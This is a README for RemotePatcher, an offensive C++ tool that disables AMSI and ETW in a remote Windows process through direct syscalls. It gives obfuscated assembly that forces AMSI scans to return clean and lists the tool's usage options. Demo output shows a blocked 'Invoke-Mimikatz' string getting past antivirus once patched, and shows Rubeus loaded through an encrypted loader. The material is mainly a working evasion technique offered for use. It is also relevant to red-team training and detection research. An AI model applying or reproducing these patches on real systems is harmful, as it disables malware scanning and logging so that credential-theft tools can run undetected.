# RemotePatcher
RemotePatcher is a tinny C++ program that patch AMSI/ETW for remote process via direct syscall. I wrote this to practice C++ programming skill and implement something with [SysWhispers3](https://github.com/klezVirus/SysWhispers3).



## A Little Twist

@RastaMouse's assembly code that commonly used

```
mov eax, 0x80070057
ret
```

Make a bit calculation but still do the same which return AMSI_RESULT_CLEAN

```
xor    eax,eax
add    eax,0x7dfdfe4e
add    eax,0x02090209
ret
```

Convert aessmbly code to hex byte array [here](https://defuse.ca/online-x86-assembler.htm#disassembly)



## Usage

```
cmd> .\RemotePatcher.exe -h
RemotePatcher
More info: https://github.com/Hagrid29/RemotePatcher/
Options:
  --exe "[cmd]" the program that will be executed and patched
  --pid [pid]   the process ID that will be patched
  -na           to NOT patch AMSI
  -ne           to NOT patch ETW
  -ao           to patch AmsiOpenSession instead of AmsiScanBuffer
  -l            to load amsi.dll
```

**Patch exiting process**

```
PS> "Invoke-Mimikatz"
At line:1 char:1
+ "Invoke-Mimikatz"
+ ~~~~~~~~~~~~~~~~~
This script contains malicious content and has been blocked by your antivirus software.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : ScriptContainedMaliciousContent

PS> $pid
9756
PS> .\RemotePatcher.exe --pid 9756 -l
[+] Patched etw!
[+] Patched amsi!
PS> "Invoke-Mimikatz"
Invoke-Mimikatz
```

**Start a new program**

CSLoader.exe is a C# binary of [NetLoader](https://github.com/Flangvik/NetLoader) with AMSI/ETW patch functions removed.

```
.\RemotePatcher.exe --exe ".\CSLoader.exe --path rubeus.txt --key mykey --args hash /password:aaa"
[+] Patched etw!
[+] Patched amsi!
[+] Decrypting using key 'mykey'
[+] PATH : ru.txt
[+] Arguments : hash /password:aaa
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : aaa
[*]       rc4_hmac             : E24106942BF38BCF57A6A4B29016EFF6

[!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
```



## References

* https://rastamouse.me/memory-patching-amsi-bypass/
* https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
* https://github.com/klezVirus/SysWhispers3


